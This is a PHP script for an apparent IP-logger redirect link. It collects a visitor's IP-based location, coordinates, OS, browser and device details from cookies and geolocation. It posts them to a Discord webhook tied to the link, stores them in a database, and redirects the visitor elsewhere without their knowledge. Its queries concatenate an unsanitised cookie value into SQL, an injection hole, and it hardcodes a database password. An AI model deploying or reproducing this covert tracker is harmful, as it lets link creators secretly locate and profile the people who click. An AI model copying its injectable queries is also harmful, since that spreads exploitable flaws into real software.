<?php
$servername = "localhost";
$username = "user";
$password = "QAZ123qaz";
$dbname = "test";
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
ini_set('display_errors','off');
$id = $_COOKIE['id'];
$data = urldecode($_COOKIE['ba']);
$arr = json_decode($data, true);
$ba = $arr["ba"];
$timezone = $arr["time"];
$br = $arr['br'];
$os = $arr['os'];
$dev = $arr['dev'];
$arh = $arr['arh'];
if ($dev == ''){
    $dev='Not detected';
}
//Debug Mode
$debug = 0;

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];


$time = date('H:i:s Y-m-d');
require_once('script.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
//LOGGING END
$sql = "SELECT * FROM main2 where id = '".$id."' ";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        $acces = $row['acces'];
        $log = $row['log'];
        $url = $row["url"];
        $webhook=  $row['discord'];
        $current_data = $row['data'];

    }

} else {
   #PHP-page
    header("Location: /404.php");
}

echo $_POST['data'];
//MESSAGE SEND TO DISCORD
$make_json = json_encode(array ('content'=>
"
IP: {$geoplugin->ip}
Os: $os
Arhicteture:$arh
Browser: $br
Time-UTC: $time
City: {$geoplugin->city}
Region: {$geoplugin->region}
Region Code: {$geoplugin->regionCode}
Country: {$geoplugin->countryName}
Country code: {$geoplugin->countryCode}
Latitude(ip): {$geoplugin->latitude}
Longitude(ip): {$geoplugin->longitude}
Accuracy (Miles(ip): {$geoplugin->locationAccuracyRadius}
Timezone: $timezone
Device: $dev
==========================================
Advance
lol: $data
UserAgent: $ba
=========================================================
"
));


if($debug){
    echo $id.'<br>';
    echo $acces .'<br>';
    echo $log .'<br>';
    echo $url .'<br>';
    echo $webhook .'<br>';
    echo $timezone.'<br>';
    echo $ba.'<br>';
    echo $os.'<br>';


}

$exec = curl_init("$webhook");
curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $exec, CURLOPT_POST, 1);
curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $exec, CURLOPT_HEADER, 0);
curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $exec );
echo  $_POST['data'];
#Del cookies
setcookie("ba", null);
setcookie("id", null);
/*###########################################
 * SET DATA IN DB
 *################################*/

$db = array(
    "ip"=>$geoplugin->ip,
    "os"=>$os,
    "arh"=>$arh,
    "br"=>$br,
    "time"=>$time,
    "city"=>$geoplugin->city,
    "region"=>$geoplugin->region,
    "regioncode"=>$geoplugin->regionCode,
    "country"=>$geoplugin->countryName,
    "countrycode"=>$geoplugin->countryCode,
    "lat"=>$geoplugin->latitude,
    "long"=>$geoplugin->longitude,
    "acu"=>$geoplugin->locationAccuracyRadius,
    "timezone"=>$timezone,
    "dev"=>$dev,
    "ba"=>$ba
);

$array_data = json_decode($current_data, true);
$array_data[] = $db;
$final_data = json_encode($array_data);
$dbsql = "UPDATE `main2` SET `data` = '".$final_data."' WHERE `main2`.`id` = '".$id."'; ";
#send db update quary
if ($conn->query($dbsql) === TRUE) {
    $conn->close();
}


header("Location:$url");
?>

